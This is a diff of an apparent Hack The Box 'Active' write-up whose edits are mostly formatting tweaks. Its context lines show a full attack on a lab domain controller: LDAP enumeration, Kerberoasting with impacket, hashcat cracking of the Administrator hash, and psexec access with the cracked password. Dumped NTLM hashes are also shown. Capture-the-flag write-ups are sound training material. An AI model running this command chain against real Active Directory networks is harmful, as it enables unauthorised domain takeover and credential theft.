@@ -122,7 +122,7 @@ The leaked dns name is correct, so far so good until now.  Next step is try to d
 
 ```bash	
 
-dumbland () hackthebox/active/recon :: ldapsearch -h 10.10.10.100 -p 389 -x -b "DC=active,DC=htb"                                                                           
+dumbland () hackthebox/active/recon :: ldapsearch -h 10.10.10.100 -p 389 -x -b "DC=active,DC=htb" 
 # extended LDIF
 #
 # LDAPv3
@@ -317,7 +317,7 @@ Lets filter this ldapsearch to lookup for user
 So far so good.   I used **GetAdUSer.py** from impacket scripts to dump all domain users:
 
 ```bash	
-dumbland () hackthebox/active/recon :: ~/pentest/impacket/examples/GetADUsers.py -all active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100                             
+dumbland () hackthebox/active/recon :: ~/pentest/impacket/examples/GetADUsers.py -all active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
 
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
@@ -332,7 +332,7 @@ SVC_TGS                                               2018-07-18 16:14:38.402764
 
 
 
-I Combine booth user lists and sort them to remove duplicate names. Now Lets dive in "kerberoasting".
+I Combine booth user lists and sort them to remove duplicate names. Now Lets dive in **"kerberoasting"**.
 
 ## Kerberoasting 101 for dummies
 
@@ -362,7 +362,7 @@ dn: CN=SVC_TGS,CN=Users,DC=active,DC=htb
 
 
 
-So the administrator is configured with SPN that can be used for achieve a "kerberoasting"
+So the administrator is configured with SPN that can be used for achieve a "kerberoasting":
 
 ```bash
 dumbland () hackthebox/active/recon :: ~/pentest/impacket/examples/GetUserSPNs.pyactive.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
@@ -387,11 +387,12 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$9b78e5712a480f7bcece18985
 
 
 
-Now it is *easy* part. Crack the hash.
+Now it is *easy* part. Crack the hash:
 
 ```bash
 dumbland () hackthebox/active/recon :: hashcat -m 13100 --force -a 0 admin-hash.txt
 /mnt/hgfs/hackthebox/json/rockyou.txt
+
 hashcat (v5.1.0) starting...
 
 Applicable optimizers:
@@ -419,15 +420,15 @@ I already know the port 445 is open, so let see what kind of privilege I have:
 ```bash
 dumbland () hackthebox/active/recon :: crackmapexec smb 10.10.10.100 -u Administrator -p Ticketmaster1968
 
-
 SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:ACTIVE) (signing:True) (SMBv1:False)
 SMB         10.10.10.100    445    DC               [+] ACTIVE\Administrator:Ticketmaster1968 (Pwn3d!)
 ```
 
-Wonderful. My suspect is right. I am domain admin. 
+Wonderful. My suspect is right. I am domain admin:
 
 ```bash
-dumbland () hackthebox/active/recon :: ~/pentest/impacket/examples/psexec.py administrator:Ticketmaster1968@10.10.10.100                                                                           1 ↵
+dumbland () hackthebox/active/recon :: ~/pentest/impacket/examples/psexec.py administrator:Ticketmaster1968@10.10.10.100
+
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
 [*] Requesting shares on 10.10.10.100.....
@@ -523,8 +524,10 @@ ACTIVE\DC$:aad3b435b51404eeaad3b435b51404ee:4c90238c3f1ac95e6eb30889bf0c71e0:::
 
 ## Tools used in this post
 
+- https://linux.die.net/man/1/ldapsearch
 - https://github.com/SecureAuthCorp/impacket
 - https://github.com/byt3bl33d3r/CrackMapExec
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py
 
 ## Terminal Customization 
 
